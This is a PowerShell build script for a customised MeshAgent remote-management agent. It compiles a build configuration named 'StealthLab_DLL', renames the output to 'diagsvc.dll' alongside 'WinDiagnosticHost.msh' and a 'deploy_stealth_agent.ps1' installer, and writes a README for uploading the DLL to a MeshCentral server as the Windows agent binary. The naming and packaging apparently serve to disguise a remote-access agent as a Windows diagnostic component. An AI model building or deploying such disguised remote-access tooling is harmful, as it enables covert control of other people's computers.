# Complete MeshAgent Build Pipeline
param([switch]$Clean)

Write-Host "=== MeshAgent Complete Build ===" -ForegroundColor Cyan
Write-Host ""

# Step 1: Embed provisioning
Write-Host "[1/4] Embedding provisioning..." -ForegroundColor Yellow
Push-Location tools
.\embed_provisioning_simple.ps1
Pop-Location

# Step 2: Build DLL
Write-Host "[2/4] Building DLL..." -ForegroundColor Yellow
Push-Location meshservice

$msbuild = "C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\MSBuild.exe"

if ($Clean) {
    & $msbuild MeshService-2022.vcxproj /t:Clean /p:Configuration=StealthLab_DLL /p:Platform=x64 /v:minimal | Out-Null
}

& $msbuild MeshService-2022.vcxproj /t:Build /p:Configuration=StealthLab_DLL /p:Platform=x64 /v:minimal

if ($LASTEXITCODE -ne 0) {
    Write-Host "[ERROR] Build failed!" -ForegroundColor Red
    exit 1
}

Pop-Location

# Step 3: Package
Write-Host "[3/4] Creating package..." -ForegroundColor Yellow
$outputDir = "dist\package_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
New-Item -Path $outputDir -ItemType Directory -Force | Out-Null

Copy-Item "meshservice\x64\StealthLab_DLL\MeshService-2022.dll" "$outputDir\diagsvc.dll"
Copy-Item "WinDiagnosticHost.msh" "$outputDir\" -ErrorAction SilentlyContinue
Copy-Item "deploy_stealth_agent.ps1" "$outputDir\install.ps1" -ErrorAction SilentlyContinue
Copy-Item "branding_config.json" "$outputDir\"

$dllHash = (Get-FileHash "$outputDir\diagsvc.dll" -Algorithm SHA256).Hash

$readme = @"
MeshAgent Stealth Build
Built: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
SHA256: $dllHash

UPLOAD TO MESHCENTRAL:
scp diagsvc.dll user@server:/var/lib/meshcentral/meshcentral-data/agents-custom/meshagent_win32_x64.exe
"@

$readme | Out-File "$outputDir\README.txt" -Encoding UTF8

Write-Host "[4/4] Generating checksums..." -ForegroundColor Yellow
"SHA256: $dllHash" | Out-File "$outputDir\checksums.txt" -Encoding UTF8

Write-Host ""
Write-Host "=== BUILD COMPLETE ===" -ForegroundColor Green
Write-Host "Package: $outputDir" -ForegroundColor Cyan
Write-Host "DLL: diagsvc.dll" -ForegroundColor Cyan
Write-Host "Hash: $($dllHash.Substring(0,16))..." -ForegroundColor Gray
Write-Host ""
